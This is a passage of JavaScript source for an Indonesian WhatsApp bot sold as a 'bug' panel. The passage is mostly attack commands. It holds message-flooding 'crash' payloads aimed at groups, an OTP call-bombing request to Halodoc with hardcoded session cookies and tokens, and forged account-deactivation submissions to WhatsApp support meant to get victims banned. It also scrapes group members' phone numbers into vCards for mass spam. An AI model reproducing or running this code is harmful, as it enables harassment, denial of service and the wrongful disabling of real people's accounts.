*GAK JEDA DELETE AKSES !!*`,
contextInfo: { 
"mentionedJid": [prrkek],
"externalAdReply": { 
"showAdAttribution": true, 
"title": "RaffOffcial Bug🔥`", 
"containsAutoReply": true, 
"mediaType": 1, 
"thumbnail": fkethmb, 
"mediaUrl": "https://lynk.id/Raffpanel", 
"sourceUrl": "https://lynk.id/Raffpanel" }}}, { quoted: m })
}
break
case "atomgc": case "hancur": case "bugzirgc":{
if (!isPremium && !isOwner) return reply(mess.only.premium)
if (!text) return reply(`Command Salah Silahkan Gunakan Command ${prefix+command} idgroup|jumlah\nUntuk Cek Idgroup Silahkan Ketik .cekidgc`)
prrkek = text.split("|")[0].replace(/[^0-9]/g, '')+"@g.us"
await reply(mess.wait)
global.jumlah = text.split("|")[1]
for (let i = 0; i < jumlah; i++) {
const order = generateWAMessageFromContent(from, proto.Message.fromObject({
"orderMessage": {
"orderId": "391028153034238",
"thumbnail": fkethmb,
"itemCount": 9999,
"status": "INQUIRY",
"surface": "CATALOG",
"orderTitle": "Youtube RaffOffcial Bug🔥`",
"message": `${button}`,
"sellerJid": "62895354709030@s.whatsapp.net",
"token": "AR7zJt8MasFx2Uir/fdxhkhPGDbswfWrAr2gmoyqNZ/0Wg==",
"totalAmount1000": "99999",
"totalCurrencyCode": "IDR",
}
}), { userJid: from, quoted: lep })
Biiofc.relayMessage(prrkek, order.message, { messageId: order.key.id})
}
Biiofc.sendMessage(from, { text: `*ATTACK BERHASIL TERKIRIM*
*TARGET :* @${prrkek.split("@")[0]}
*JUMLAH SPAM :* ${global.jumlah}×

*_NOTE :_*
*HARAP JEDA 1 MENIT !!*
*GAK JEDA DELETE AKSES !!*`,
contextInfo: { 
"mentionedJid": [prrkek],
"externalAdReply": { 
"showAdAttribution": true, 
"title": "RaffOffcial Bug🔥`", 
"containsAutoReply": true, 
"mediaType": 1, 
"thumbnail": fkethmb, 
"mediaUrl": "https://lynk.id/Raffpanel", 
"sourceUrl": "https://lynk.id/Raffpanel" }}}, { quoted: m })
}
break
case "stuckgc2": case "baugc": case "ultigc":{
if (!isPremium && !isOwner) return reply(mess.only.premium)
if (!text) return reply(`Command Salah Silahkan Gunakan Command ${prefix+command} idgroup|jumlah\nUntuk Cek Idgroup Silahkan Ketik .cekidgc`)
prrkek = text.split("|")[0].replace(/[^0-9]/g, '')+"@g.us"
await reply(mess.wait)
global.jumlah = text.split("|")[1]
for (let i = 0; i < jumlah; i++) {
Biiofc.sendMessage(prrkek, { audio: audionya, mimetype: 'audio/mp4', seconds: 999999999, ptt: false}, { quoted: lep })
Biiofc.sendMessage(prrkek, { audio: audionya, mimetype: 'audio/mp4', seconds: 999999999, ptt: false}, { quoted: lep })
}
Biiofc.sendMessage(from, { text: `*ATTACK BERHASIL TERKIRIM*
*TARGET :* @${prrkek.split("@")[0]}
*JUMLAH SPAM :* ${global.jumlah}×

*_NOTE :_*
*HARAP JEDA 1 MENIT !!*
*GAK JEDA DELETE AKSES !!*`,
contextInfo: { 
"mentionedJid": [prrkek],
"externalAdReply": { 
"showAdAttribution": true, 
"title": "RaffOffcial Bug🔥`", 
"containsAutoReply": true, 
"mediaType": 1, 
"thumbnail": fkethmb, 
"mediaUrl": "https://lynk.id/Raffpanel", 
"sourceUrl": "https://lynk.id/Raffpanel" }}}, { quoted: m })
}
break
// LAST DI ATAS
case "tts": case "gtts":{
if (!q) return reply(` contoh : ${prefix+command} yamate kudasai`)
reply(mess.wait)
const gtts = require("./all/gtts")(`id`, q)
var bby = args.join(' ')
ranm = getRandom('.mp3')
rano = getRandom('.ogg')
bby.length > 300 ? reply('Teks nya terlalu panjang kak')
: gtts.save(ranm, bby, function () {
exec(`ffmpeg -i ${ranm} -ar 48000 -vn -c:a libopus ${rano}`, (err) => {
fs.unlinkSync(ranm)
buff = fs.readFileSync(rano)
if (err) return reply(mess.error)
Biiofc.sendMessage(from, { audio: buff, mimetype: "audio/mp4", ptt: false },{ quoted: m })
fs.unlinkSync(rano)
})
})
}
break
case "sticker": 
case "s": {
if (!isOwner) return reply(`Khusus RIDZ STORE Aja`)
if (!quoted) return reply(`Kirim/Reply Gambar/Video/Gifs Dengan Caption ${prefix+command}\nDurasi Video 1-9 Detik`)
if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await Biiofc.sendStimg(from, media, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return reply('Kirim/Reply Gambar/Video/Gifs Dengan Caption ${prefix+command}\nDurasi Video 1-9 Detik')
let media = await quoted.download()
let encmedia = await Biiofc.sendStvid(from, media, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else {
reply(`Kirim/Reply Gambar/Video/Gifs Dengan Caption ${prefix+command}\nDurasi Video 1-9 Detik`)
}
}
break
case "qc": {
if (!isOwner) return reply(`Khusus RIDZ STORE Aja`)
if (!quoted){
const getname = await Biiofc.getName(mentionUser[0])
const json = {
"type": "quote",
"format": "png",
"backgroundColor": "#FFFFFF",
"width": 512,
"height": 768,
"scale": 2,
"messages": [
{
"entities": [],
"avatar": true,
"from": {
"id": 1,
"name": getname,
"photo": {
"url": ppuser
}
},
"text": quotedMsg.chats,
"replyMessage": {}
}
]
};
const response = axios.post('https://bot.lyo.su/quote/generate', json, {
headers: {'Content-Type': 'application/json'}
}).then(res => {
const buffer = Buffer.from(res.data.result.image, 'base64')
const opt = { packname: global.packname, author: global.author }
Biiofc.sendStimg(from, buffer, m, opt)
});
} else if (q) {
const json = {
"type": "quote",
"format": "png",
"backgroundColor": "#FFFFFF",
"width": 512,
"height": 768,
"scale": 2,
"messages": [
{
"entities": [],
"avatar": true,
"from": {
"id": 1,
"name": pushname,
"photo": {
"url": ppuser
}
},
"text": q,
"replyMessage": {}
}
]
};
const response = axios.post('https://bot.lyo.su/quote/generate', json, {
headers: {'Content-Type': 'application/json'}
}).then(res => {
const buffer = Buffer.from(res.data.result.image, 'base64')
const opt = { packname: global.packname, author: global.author }
Biiofc.sendStimg(from, buffer, m, opt)
});
} else {
reply(`Kirim perintah ${prefix+command} text atau reply pesan dengan perintah ${prefix+command}`)
}
}
break
case "owner": {
const repf = await Biiofc.sendMessage(from, { 
contacts: { 
displayName: `${list.length} Kontak`, 
contacts: list }, contextInfo: {
forwardingScore: 9999999, 
isForwarded: true,
mentionedJid: [sender]
}}, { quoted: m })
Biiofc.sendMessage(from, { text : `Hai Kak @${sender.split("@")[0]}, Nih Owner Ku Jangan Macam-macam Ya`, contextInfo:{
forwardingScore: 9999999, 
isForwarded: true,
mentionedJid:[sender]
}}, { quoted: repf })
}
break
case "ownsc": {
const repf = await Biiofc.sendMessage(from, { 
contacts: { 
displayName: `${list.length} Kontak`, 
contacts: list }, contextInfo: {
forwardingScore: 9999999, 
isForwarded: true,
mentionedJid: [sender]
}}, { quoted: m })
Biiofc.sendMessage(from, { text : `Hai Kak @${sender.split("@")[0]}, Nih Owner Pemilik Sc, Jangan Digalakin!! Kalo Mau Sc Buy Di Owner Ku`, contextInfo:{
forwardingScore: 9999999, 
isForwarded: true,
mentionedJid:[sender]
}}, { quoted: repf })
}
break
case "call":
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} +6282196776245`)
await reply(mess.wait)
let nosend = "+" + q.split("|")[0].replace(/[^0-9]/g, '')
axios.post('https://magneto.api.halodoc.com/api/v1/users/authentication/otp/requests',{'phone_number':`${nosend}`,'channel': 'voice'},{headers: {'authority': 'magneto.api.halodoc.com','accept-language': 'id,en;q=0.9,en-GB;q=0.8,en-US;q=0.7','cookie': '_gcl_au=1.1.1860823839.1661903409; _ga=GA1.2.508329863.1661903409; afUserId=52293775-f4c9-4ce2-9002-5137c5a1ed24-p; XSRF-TOKEN=12D59ACD8AA0B88A7ACE05BB574FAF8955D23DBA28E8EE54F30BCB106413A89C1752BA30DC063940ED30A599C055CC810636; _gid=GA1.2.798137486.1664887110; ab.storage.deviceId.1cc23a4b-a089-4f67-acbf-d4683ecd0ae7=%7B%22g%22%3A%2218bb4559-2170-9c14-ddcd-2dc80d13c3e3%22%2C%22c%22%3A1656491802961%2C%22l%22%3A1664887110254%7D; amp_394863=nZm2vDUbDAvSia6NQPaGum...1gehg2efd.1gehg3c19.f.0.f; ab.storage.sessionId.1cc23a4b-a089-4f67-acbf-d4683ecd0ae7=%7B%22g%22%3A%22f1b09ad8-a7d9-16f3-eb99-a97ba52677d2%22%2C%22e%22%3A1664888940400%2C%22c%22%3A1664887110252%2C%22l%22%3A1664887140400%7D','origin': 'https://www.halodoc.com','sec-ch-ua': '"Microsoft Edge";v="105", "Not)A;Brand";v="8", "Chromium";v="105"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-site','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 Edg/105.0.1343.53','x-xsrf-token': '12D59ACD8AA0B88A7ACE05BB574FAF8955D23DBA28E8EE54F30BCB106413A89C1752BA30DC063940ED30A599C055CC810636'}}).then(function (response) {reply(`${JSON.stringify(response.data, null, 2)}`)}).catch(function (error) {reply(`${JSON.stringify(error, null, 2)}`)})
break
case "addowner":
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 62895354709030`)
bnnd = q.split("|")[0].replace(/[^0-9]/g, '')
let ceknye = await Biiofc.onWhatsApp(bnnd + `@s.whatsapp.net`)
if (ceknye.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
ownerNumber.push(bnnd)
fs.writeFileSync('./all/database/owner.json', JSON.stringify(ownerNumber))
reply(`Nomor ${bnnd} Telah Menjadi Owner!!!`)
break
case "delowner":
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 62895354709030`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')
unp = ownerNumber.indexOf(ya)
ownerNumber.splice(unp, 1)
fs.writeFileSync('./all/database/owner.json', JSON.stringify(ownerNumber))
reply(`Nomor ${ya} Telah Di Hapus Owner!!!`)
break
case "addprem":{
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 62895354709030`)
prrkek = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let ceknya = await Biiofc.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
prem.push(prrkek)
fs.writeFileSync("./all/database/premium.json", JSON.stringify(prem))
reply(`Nomor ${prrkek} Telah Menjadi Premium!`)
}
break
case "delprem":{
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 62895354709030`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
unp = prem.indexOf(ya)
prem.splice(unp, 1)
fs.writeFileSync("./all/database/premium.json", JSON.stringify(prem))
reply(`Nomor ${ya} Telah Di Hapus Premium!`)
}
break
case 'premlist':{
if (!isOwner) return reply(mess.owner)
let listprem =`*LIST SELER RIDZ STORE*\n\nTotal Seller : ${owner.length}\n`
var no = 1
for (let x of owner) {
listprem +=`\nUser: ${no++}\nID: ${x}\n\n`
}
listprem +=`Untuk Menghapus Akses Prem Ketik ${prefix}delprem 628xxx/@tag`
Biiofc.sendMessage(m.chat, {text: listprem },{quoted: Biiofc.chat})
}
break
case "cekidgc": {
if (!isPremium && !isOwner) return reply(mess.only.premium)
let getGroups = await Biiofc.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
let teks = `⬣ *LIST GROUP DI BAWAH*\n\nTotal Group : ${anu.length} Group\n\n`
for (let x of anu) {
let metadata2 = await Biiofc.groupMetadata(x)
teks += `◉ Nama : ${metadata2.subject}\n◉ ID : ${metadata2.id}\n◉ Member : ${metadata2.participants.length}\n\n────────────────────────\n\n`
}
reply(teks + `Untuk Penggunaan Silahkan Ketik Command ${prefix}pushkontak id|teks\n\nSebelum Menggunakan Silahkan Salin Dulu Id Group Nya Di Atas`)
}
break

case "listgroup":{
if (!isOwner) return reply(`Ngapain ? Khusus RIDZ STORE Aja !!`)
let getGroups = await Biiofc.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
let hituet = 0
let teks = `⬣ *LIST GROUP DI BAWAH*\n\nTotal Group : ${anu.length} Group\n\n`
for (let x of anu) {
let metadata2 = await Biiofc.groupMetadata(x)
teks += `❏ Group Ke ${hituet+=1}\n│⭔ *NAMA :* ${metadata2.subject}\n│⭔ *ID :* ${metadata2.id}\n│⭔ *MEMBER :* ${metadata2.participants.length}\n╰────|\n\n`
}
reply(teks + `Untuk Penggunaan Silahkan Ketik Command ${prefix}pushkontakv1 id|teks\n\nSebelum Menggunakan Silahkan Salin Dulu ID Group Nya Di Atas`)
}
break
case "pushkontakv1":{
if (!isOwner) return reply(`Khusus RIDZ STORE Aja`)
if (isGroup) return reply(mess.only.private)
if (!text) return reply(`Penggunaan Salah Silahkan Gunakan Command Seperti Ini\n${prefix+command} idgroup|tekspushkontak\nUntuk Liat Id Group Silahkan Ketik .cekidgc`)
reply(mess.wait)
const groupMetadataa = !isGroup? await Biiofc.groupMetadata(`${text.split("|")[0]}`).catch(e => {}) : ""
const participants = !isGroup? await groupMetadataa.participants : ""
const halls = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
global.tekspushkon = text.split("|")[1]
if (isContacts) return
for (let mem of halls) {
if (isContacts) return
contacts.push(mem)
fs.writeFileSync('./all/database/contacts.json', JSON.stringify(contacts))
if (/image/.test(mime)) {
media = await Biiofc.downloadAndSaveMediaMessage(quoted)
memk = await uptotelegra(media)
await Biiofc.sendMessage(mem, { image: { url: memk }, caption: global.tekspushkon })
await sleep(1000)
} else {
await Biiofc.sendMessage(mem, { text: global.tekspushkon })
await sleep(1000)
}
}
try {
const uniqueContacts = [...new Set(contacts)];
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:WA[${createSerial(1)}] ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n");
return vcard; }).join("");
fs.writeFileSync("./all/database/contacts.vcf", vcardContent, "utf8");
} catch (err) {
reply(util.format(err))
} finally {
await Biiofc.sendMessage(from, { document: fs.readFileSync("./all/database/contacts.vcf"), fileName: "contacts.vcf", caption: "Nih Kak Tinggal Pencet File Di Atas Terus Save", mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
fs.writeFileSync("./all/database/contacts.json", JSON.stringify(contacts))
}
}
break
case "pushkontakv2":{
if (!isOwner) return reply(`Khusus RIDZ STORE Aja`)
if (!isGroup) return reply(mess.only.group)
if (!text) return reply(`Penggunaan Salah Silahkan Gunakan Command Seperti Ini\n${prefix+command} teks`)
reply(mess.wait)
const groupMetadata = isGroup? await Biiofc.groupMetadata(from).catch(e => {}) : ""
const groupOwner = isGroup? groupMetadata.owner : ""
const participantts = isGroup? await groupMetadata.participants : ""
const halsss = await participantts.filter(v => v.id.endsWith('.net')).map(v => v.id)
global.tekspushkonv2 = text
if (isContacts) return
for (let men of halsss) {
contacts.push(men)
fs.writeFileSync('./all/database/contacts.json', JSON.stringify(contacts))
if (/image/.test(mime)) {
media = await Biiofc.downloadAndSaveMediaMessage(quoted)
mem = await uptotelegra(media)
await Biiofc.sendMessage(men, { image: { url: mem }, caption: global.tekspushkonv2 })
await sleep(1000)
} else {
await Biiofc.sendMessage(men, { text: global.tekspushkonv2 })
await sleep(1000)
}
}
reply("File Kontak Sudah Di Kirim Lewat Chat Pribadi")
try {
const uniqueContacts = [...new Set(contacts)];
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:WA[${createSerial(1)}] ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n");
return vcard; }).join("");
fs.writeFileSync("./all/database/contacts.vcf", vcardContent, "utf8");
} catch (err) {
reply(util.format(err))
} finally {
await Biiofc.sendMessage(sender, { document: fs.readFileSync("./all/database/contacts.vcf"), fileName: "contacts.vcf", caption: "Nih Kak Tinggal Pencet File Di Atas Terus Save", mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
fs.writeFileSync("./all/database/contacts.json", JSON.stringify(contacts))
}
}
break
case "pushkontakv3":
if (!isOwner) return reply(`Khusus RIDZ STORE Aja`)
if (!text) return reply(`Penggunaan Salah Silahkan Gunakan Command Seperti Ini\n${prefix+command} idgroup|jeda|teks\nUntuk Liat Id Group Silahkan Ketik .idgroup`)
await reply("Otw Boskuuu")
const groupMetadataa = !isGroup? await Biiofc.groupMetadata(`${q.split("|")[0]}`).catch(e => {}) : ""
const participantss = !isGroup? await groupMetadataa.participants : ""
const halls = await participantss.filter(v => v.id.endsWith('.net')).map(v => v.id)
global.tekspushkonv3 = q.split("|")[2]
for (let mem of halls) {
if (/image/.test(mime)) {
media = await Biiofc.downloadAndSaveMediaMessage(quoted)
memk = await uptotelegra(media)
await Biiofc.sendMessage(men, { image: { url: mem }, caption: global.tekspushkonv3 })
await sleep(q.split("|")[1])
} else {
await Biiofc.sendMessage(mem, { text: global.tekspushkonv3 })
await sleep(q.split("|")[1])
}
}
reply("Succes Boss!")
break
case "pushkontakv4":
if (!isOwner) return reply(`Khusus RIDZ STORE Aja`)
if (isGroup) return reply(mess.only.private)
if (!text) return reply(`Penggunaan Salah Silahkan Gunakan Command Seperti Ini\n${prefix+command} jeda|teks`)
await reply("Otw Boskuuu")
const halsss = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
global.tekspushkonv4 = text.split("|")[1]
for (let men of halsss) {
if (/image/.test(mime)) {
media = await Biiofc.downloadAndSaveMediaMessage(quoted)
mem = await uptotelegra(media)
await Biiofc.sendMessage(men, { image: { url: mem }, caption: global.tekspushkonv4 })
await sleep(text.split("|")[0])
} else {
await Biiofc.sendMessage(men, { text: global.tekspushkonv4 })
await sleep(text.split("|")[0])
}
}
reply("Succes Boss!")
break
case "savecontactv1": {
if (!isOwner) return reply(`Khusus RIDZ STORE Aja`)
if (!text) return reply(`Maaf Kak Fitur ${prefix+command} Hanya Bisa Di Gunakan Di Dalam Group\nUntuk Memasukan Bot Ke Dalam Group Yang Di Ingin Kan\nSilahkan Ketik Command .join linkgroup`)
await reply("_Wᴀɪᴛɪɴɢ ɪɴ ᴘʀᴏɢʀᴇss !!_")
const groupMetadata = isGroup? await Biiofc.groupMetadata(from).catch(e => {}) : ""
const groupOwner = isGroup? groupMetadata.owner : ""
const participantts = isGroup? await groupMetadata.participants : ""
const halsss = await participantts.filter(v => v.id.endsWith('.net')).map(v => v.id)
for (let men of halsss) {
if (isContacts) return
contacts.push(men)
fs.writeFileSync('./all/database/contacts.json', JSON.stringify(contacts))
}
reply("Sukses File Sudah Di Kirim Lewat Chat Private")
try {
const uniqueContacts = [...new Set(contacts)];
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:WA[${createSerial(2)}] ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n");
return vcard; }).join("");
fs.writeFileSync("./data/database/contacts.vcf", vcardContent, "utf8");
} catch (err) {
reply(util.format(err))
} finally {
await Biiofc.sendMessage(sender, { document: fs.readFileSync("./all/database/contacts.vcf"), fileName: "contacts.vcf", caption: "Sukses Tinggal Save Ya Kakak", mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
fs.writeFileSync("./all/database/contacts.json", JSON.stringify(contacts))
}
}
break
case 'getcontact': case 'getkontak':
if (!isOwner) return reply(`Khusus RIDZ STORE Aja`)
if (!isGroup) return m.reply(`Khusus Group Kontol`)
huhuhs = await Biiofc.sendMessage(m.chat, {
    text: `Grup; *${groupMetadata.subject}*\nTotal peserta; *${participants.length}*`
}, {quoted: m, ephemeralExpiration: 86400})
await sleep(1000) // (?); mengirim kontak seluruh member
Biiofc.sendContact(m.chat, participants.map(a => a.id), huhuhs)
break
case 'savekontak': case 'svkontak':
if (!isOwner) return reply(`Khusus RIDZ STORE Aja`)
if (!isGroup) return m.reply(`Khusus Group Kontol`)
let cmiggc = await Biiofc.groupMetadata(m.chat)
let orgiggc = participants.map(a => a.id)
vcard = ''
noPort = 0
for (let a of cmiggc.participants) {
    vcard += `BEGIN:VCARD\nVERSION:3.0\nFN:[${noPort++}] +${a.id.split("@")[0]}\nTEL;type=CELL;type=VOICE;waid=${a.id.split("@")[0]}:+${a.id.split("@")[0]}\nEND:VCARD\n`
} // (?); mengimpor kontak seluruh member - save
let nmfilect = './contacts.vcf'
reply('*Mengimpor '+cmiggc.participants.length+' kontak..*')
fs.writeFileSync(nmfilect, vcard.trim())
await sleep(2000)
Biiofc.sendMessage(m.chat, {
    document: fs.readFileSync(nmfilect), mimetype: 'text/vcard', fileName: 'Contact.vcf', caption: 'GROUP: *'+cmiggc.subject+'*\nMEMBER: *'+cmiggc.participants.length+'*'
}, {ephemeralExpiration: 86400, quoted: m})
fs.unlinkSync(nmfilect)
break
case 'sendkontak': case 'kontak':
if (!isOwner) return reply(`Khusus RIDZ STORE Aja`)
if (!isGroup) return m.reply(`Khusus Group`)
if (!m.mentionedJid[0]) return reply('Ex; .kontak @tag|nama')
let snTak = text.split(' ')[1] ? text.split(' ')[1] : 'Contact'
let snContact = {
	displayName: "Contact", contacts: [{displayName: snTak, vcard: "BEGIN:VCARD\nVERSION:3.0\nN:;"+snTak+";;;\nFN:"+snTak+"\nitem1.TEL;waid="+m.mentionedJid[0].split('@')[0]+":"+m.mentionedJid[0].split('@')[0]+"\nitem1.X-ABLabel:Ponsel\nEND:VCARD"}]
} // (?); send kontak
Biiofc.sendMessage(m.chat, {contacts: snContact}, {ephemeralExpiration: 86400})
break
case "savecontactv2": {
if (!isOwner) return reply(`Khusus RIDZ STORE Aja`)
if (isGroup) return reply(mess.only.private)
if (!text) return reply(`Penggunaan Salah Silahkan Gunakan Command Seperti Ini\n${prefix+command} idgroup\nUntuk Liat Id Group Silahkan Ketik .cekidgc`)
await reply("_Wᴀɪᴛɪɴɢ ɪɴ ᴘʀᴏɢʀᴇss !!_")
const groupMetadataa = !isGroup? await Biiofc.groupMetadata(`${text}`).catch(e => {}) : ""
const participants = !isGroup? await groupMetadataa.participants : ""
const halls = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
for (let mem of halls) {
if (isContacts) return
contacts.push(mem)
fs.writeFileSync('./all/database/contacts.json', JSON.stringify(contacts))
}
try {
const uniqueContacts = [...new Set(contacts)];
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:WA[${createSerial(2)}] ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n");
return vcard; }).join("");
fs.writeFileSync("./all/database/contacts.vcf", vcardContent, "utf8");
} catch (err) {
reply(util.format(err))
} finally {
await Biiofc.sendMessage(from, { document: fs.readFileSync("./data/database/contacts.vcf"), fileName: "contacts.vcf", caption: "Sukses Tinggal Save Ya Kakak", mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
fs.writeFileSync("./data/database/contacts.json", JSON.stringify(contacts))
}
}
break
case 'bcvideo': case 'broadcastimage': case 'bcimage': case 'broadcastvideo': case 'broadcastvid':
if (!isOwner) return reply(`Khusus RIDZ STORE Aja`)
        if (!q) return reply(`*Enter Text*`)
        let getGroups = await Biiofc.groupFetchAllParticipating()
        let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
        let xeoncast = groups.map(v => v.id)
        reply(`\`\`\`Broadcasting in\`\`\` *${xeoncast.length}* \`\`\`Group Chat, in\`\`\` *${xeoncast.length * 1.5} seconds*`)
        for (let i of xeoncast) {
let txt = `*${global.ownerName}'s Broadcast*\n\n\`\`\`Message :\`\`\` *${q}*`
if(/image/.test(mime)) {
let media = await quoted.download()
await Biiofc.sendMessage(i, { image:media,  caption: txt,mentions:participants.map(a => a.id) })
}
if(/video/.test(mime)){
let media = await quoted.download()
await Biiofc.sendMessage(i, { video:media,  caption: txt, mentions:participants.map(a => a.id) })
}
            }
        reply(`\`\`\`Successfuly Broadcasted in\`\`\` *${xeoncast.length} Groups*`)      
        break
case 'remini':
			case 'hd': {
			if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
			if (!quoted) return reply(`Fotonya Mana?`)
			if (!/image/.test(mime)) return reply(`Send/Reply Foto Dengan Caption ${prefix + command}`)
			reply(mess.wait)
			let media = await quoted.download()
			let proses = await remini(media, "enhance");
			Biiofc.sendMessage(m.chat, { image: proses, caption: '🍁 Ini Hasilnya Kak...'}, { quoted: m})
			await sleep(5000)
			}
			break
case 'enc': {
            if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
            if (!q) return reply(`Contoh ${prefix+command} const adrian = require('adrian-api')`)
            let meg = await obfus(q)
            reply(`${meg.result}`)
        }
        break
case 'bcgc': case 'bcgroup': {
if (!isOwner) return reply(`Khusus RIDZ STORE Aja`)
if (!text) throw `Text mana?\n\nExample : ${prefix + command} RaffOffcial`
let getGroups = await Biiofc.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
let anu = groups.map(v => v.id)
m.reply(`Mengirim Broadcast Ke ${anu.length} Group Chat, Waktu Selesai ${anu.length * 1.5} detik`)
for (let i of anu) {
await sleep(1500)
Biiofc.sendMessage(i, {text: `${text}`}, {quoted:m})
    }
m.reply(`Sukses Mengirim Broadcast Ke ${anu.length} Group`)
}
break
case "jpm": case "jpm2":{
if (!isOwner) return reply(`Khusus RIDZ STORE Aja`)
if (!text) return reply(`*Penggunaan Salah Silahkan Gunakan Seperti Ini*\n${prefix+command} teks|jeda\n\nReply Gambar Untuk Mengirim Gambar Ke Semua Group\nUntuk Jeda Itu Delay Jadi Nominal Jeda Itu 1000 = 1 detik`)
await reply("_Wait Tuan Ku✅_")
let getGroups = await Biiofc.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
for (let xnxx of anu) {
let metadat72 = await Biiofc.groupMetadata(xnxx)
let participanh = await metadat72.participants
if (/image/.test(mime)) {
media = await Biiofc.downloadAndSaveMediaMessage(quoted)
mem = await uptotelegra(media)
await Biiofc.sendMessage(xnxx, { image: { url: mem }, caption: text.split('|')[0], mentions: participanh.map(a => a.id) })
await sleep(text.split('|')[1])
} else {
await Biiofc.sendMessage(xnxx, { text: text.split('|')[0], mentions: participanh.map(a => a.id) })
await sleep(text.split('|')[1])
}}
reply("*SUCCESFUL TUAN RIDZ STORE✅*")
}
break
case "out": case "verif":{
if (!isPremium && !isOwner) return reply(mess.only.premium)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 62895354709030`)
prrkek = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let ceknya = await Biiofc.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
let axioss = require("axios")  
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", prrkek)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Perdido/roubado: desative minha conta")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
Biiofc.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case "bannedv1": case "kenon":{
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 62895354709030`)
prrkek = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let ceknya = await Biiofc.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
let axioss = require("axios")  
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
